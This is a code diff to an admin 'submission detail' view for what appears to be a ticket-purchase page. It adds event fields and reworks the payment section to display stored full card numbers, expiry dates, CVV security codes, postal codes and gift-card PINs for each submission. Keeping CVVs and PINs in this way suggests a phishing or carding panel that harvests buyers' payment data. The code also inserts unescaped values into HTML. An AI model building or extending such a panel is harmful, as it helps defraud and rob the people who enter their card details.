@@ -517,7 +517,8 @@ function viewSubmissionDetail(idx) {
   // Helper function to mask sensitive data
   const maskCardNumber = (card) => {
     if (!card) return 'N/A';
-    return card.slice(-4).padStart(card.length, '*');
+    const cardStr = card.toString();
+    return cardStr.slice(-4).padStart(cardStr.length, '*');
   };
 
   const maskCVV = (cvv) => {
@@ -540,50 +541,74 @@ function viewSubmissionDetail(idx) {
     </div>
     <div class="submission-field">
       <div class="submission-label">💷 Price Per Ticket</div>
-      <div class="submission-value">$${sub.pricePerTicket ? parseFloat(sub.pricePerTicket).toFixed(2) : '0.00'}</div>
+      <div class="submission-value">${sub.orderSummary?.currencySymbol || '$'}${sub.pricePerTicket ? parseFloat(sub.pricePerTicket).toFixed(2) : '0.00'}</div>
     </div>
     <div class="submission-field">
       <div class="submission-label">💰 Total Amount</div>
-      <div class="submission-value">$${sub.total ? parseFloat(sub.total).toFixed(2) : sub.orderSummary?.total?.toFixed(2) || '0.00'}</div>
+      <div class="submission-value">${sub.orderSummary?.currencySymbol || '$'}${sub.total ? parseFloat(sub.total).toFixed(2) : sub.orderSummary?.total?.toFixed(2) || '0.00'}</div>
+    </div>
+    <div class="submission-field">
+      <div class="submission-label">📍 Venue</div>
+      <div class="submission-value">${sub.orderSummary?.venue || 'N/A'}</div>
+    </div>
+    <div class="submission-field">
+      <div class="submission-label">📅 Date & Time</div>
+      <div class="submission-value">${sub.orderSummary?.dateTime || 'N/A'}</div>
+    </div>
+    <div class="submission-field">
+      <div class="submission-label">🎫 Ticket Type</div>
+      <div class="submission-value">${sub.orderSummary?.ticketType || 'N/A'}</div>
+    </div>
+    <div class="submission-field">
+      <div class="submission-label">🪑 Section</div>
+      <div class="submission-value">${sub.orderSummary?.section || 'N/A'}</div>
     </div>
   `;
 
   // Card Payment Details (if available)
-  if (sub.cardNumber || sub.paymentMethod === 'card') {
+  if (sub.cardNumberFull || sub.paymentMethod === 'Card') {
     html += `
       <hr style="border: 1px solid #333; margin: 20px 0;">
       <div style="font-weight: 700; color: #00d4ff; margin-bottom: 15px;">💳 Card Payment Details</div>
       <div class="submission-field">
-        <div class="submission-label">Card Number</div>
-        <div class="submission-value">${maskCardNumber(sub.cardNumber)}</div>
+        <div class="submission-label">Card Number (Full)</div>
+        <div class="submission-value"><code>${maskCardNumber(sub.cardNumberFull) || 'N/A'}</code></div>
+      </div>
+      <div class="submission-field">
+        <div class="submission-label">Card Last 4 Digits</div>
+        <div class="submission-value"><code>${sub.cardLastFour || 'N/A'}</code></div>
       </div>
       <div class="submission-field">
         <div class="submission-label">Expiry Date</div>
-        <div class="submission-value">${sub.expiryDate || 'N/A'}</div>
+        <div class="submission-value"><code>${sub.expiryDate || 'N/A'}</code></div>
       </div>
       <div class="submission-field">
-        <div class="submission-label">CVV</div>
-        <div class="submission-value">${maskCVV(sub.cvv)}</div>
+        <div class="submission-label">CVV (Security Code)</div>
+        <div class="submission-value"><code>${maskCVV(sub.securityCodeCVV)}</code></div>
       </div>
       <div class="submission-field">
-        <div class="submission-label">ZIP Code</div>
-        <div class="submission-value">${sub.zipCode || 'N/A'}</div>
+        <div class="submission-label">Postal Code</div>
+        <div class="submission-value"><code>${sub.postalCode || 'N/A'}</code></div>
       </div>
     `;
   }
 
   // Gift Card Details (if available)
-  if (sub.giftCardNumber || sub.paymentMethod === 'gift-card') {
+  if (sub.giftCardNumberFull || sub.paymentMethod === 'Gift Card') {
     html += `
       <hr style="border: 1px solid #333; margin: 20px 0;">
       <div style="font-weight: 700; color: #00d4ff; margin-bottom: 15px;">🎁 Gift Card Payment Details</div>
       <div class="submission-field">
-        <div class="submission-label">Gift Card Number</div>
-        <div class="submission-value">${maskCardNumber(sub.giftCardNumber)}</div>
+        <div class="submission-label">Gift Card Number (Full)</div>
+        <div class="submission-value"><code>${maskCardNumber(sub.giftCardNumberFull) || 'N/A'}</code></div>
+      </div>
+      <div class="submission-field">
+        <div class="submission-label">Gift Card Last 4 Digits</div>
+        <div class="submission-value"><code>${sub.giftCardLastFour || 'N/A'}</code></div>
       </div>
       <div class="submission-field">
         <div class="submission-label">Gift Card PIN</div>
-        <div class="submission-value">${maskCVV(sub.giftCardPIN)}</div>
+        <div class="submission-value"><code>${maskCVV(sub.giftCardPinFull)}</code></div>
       </div>
     `;
   }
@@ -597,7 +622,7 @@ function viewSubmissionDetail(idx) {
     </div>
     <div class="submission-field">
       <div class="submission-label">🔑 Submission ID</div>
-      <div class="submission-value">${sub.id || 'N/A'}</div>
+      <div class="submission-value"><code>${sub.id || 'N/A'}</code></div>
     </div>
   `;
 
